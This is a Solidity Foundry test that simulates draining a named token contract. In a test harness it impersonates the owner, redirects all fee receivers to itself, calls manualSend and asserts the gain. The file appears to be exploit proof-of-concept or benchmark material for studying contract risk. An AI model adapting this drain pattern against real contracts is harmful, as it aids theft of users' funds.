// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 {
    function getOwner() external view returns (address);
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackFeeReceiver, address _developmentFeeReceiver, address _charityFeeReceiver, address _stakingFeeReceiver) external;
    function manualSend() external;
    function clearStuckBalance(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        owner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "OukaInu Contract");

        // Give the contract some BNB balance to drain
        deal(TARGET, 10 ether);

        // Store initial attacker balance for comparison
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Change marketingFeeReceiver to attacker address
        // Keep other receivers as they are (we need to get current values first)
        // We'll need to read current values or set them all to attacker
        // For simplicity, set all fee receivers to attacker
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).setFeeReceivers(
            address(this),  // autoLiquidityReceiver
            address(this),  // marketingFeeReceiver (most important)
            address(this),  // buyBackFeeReceiver
            address(this),  // developmentFeeReceiver
            address(this),  // charityFeeReceiver
            address(this)   // stakingFeeReceiver
        );

        // Step 3: Drain all BNB from contract to attacker (now marketingFeeReceiver)
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).manualSend();

        vm.stopPrank();

        // Step 4: Verify attacker balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
